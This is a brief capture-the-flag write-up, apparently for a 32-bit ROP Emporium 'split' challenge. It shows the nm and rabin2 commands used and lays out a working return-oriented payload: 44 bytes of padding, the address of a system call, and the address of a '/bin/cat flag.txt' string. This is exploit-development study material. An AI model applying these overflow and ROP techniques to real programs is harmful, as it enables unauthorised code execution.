same overflow, have to build a small rop chain to call 2 functions as it suggests in the challenge description.

Listing functions:
        nm split32 | grep ' t '
        08048649 t usefulFunction


It has a function named usefulFunction but it only does an ls on the folder.
The important detail is that it calls system in this function, so we can use the system call for a return address.

We can run:
        rabin2 -z split32

        000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt

so we will build the rop chain to return to the first function's system call and we will have the special string on the stack after it as an arg. 

stack will be,

JUNK
usefulFunction's system call
/bin/cat flag.txt

that makes it 

'A'*44 + 
p32(0x08048657) +
p32(0x0804a030)
